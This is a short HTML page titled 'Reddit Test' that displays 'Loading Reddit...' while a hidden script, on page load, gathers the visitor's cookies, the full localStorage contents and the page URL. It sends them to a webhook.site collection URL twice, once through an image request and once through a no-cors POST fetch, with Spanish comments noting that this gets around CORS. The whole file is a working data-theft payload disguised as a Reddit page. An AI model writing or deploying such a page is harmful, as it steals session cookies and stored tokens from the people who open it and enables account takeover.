<!DOCTYPE html>
<html>
<head>
    <title>Reddit Test</title>
    <link rel="icon" href="data:,">
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const payload = {
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage),
                url: location.href
            };

            // Método 1: Usando Image (sin CORS)
            new Image().src = 'https://webhook.site/2987fab5-8cd1-4000-b483-d6e2eef59af2?data=' + 
                encodeURIComponent(JSON.stringify(payload));

            // Método 2: Fetch con no-cors
            fetch('https://webhook.site/2987fab5-8cd1-4000-b483-d6e2eef59af2', {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(payload)
            });
        });
    </script>
</head>
<body>
    <h1>Loading Reddit...</h1>
</body>
</html>
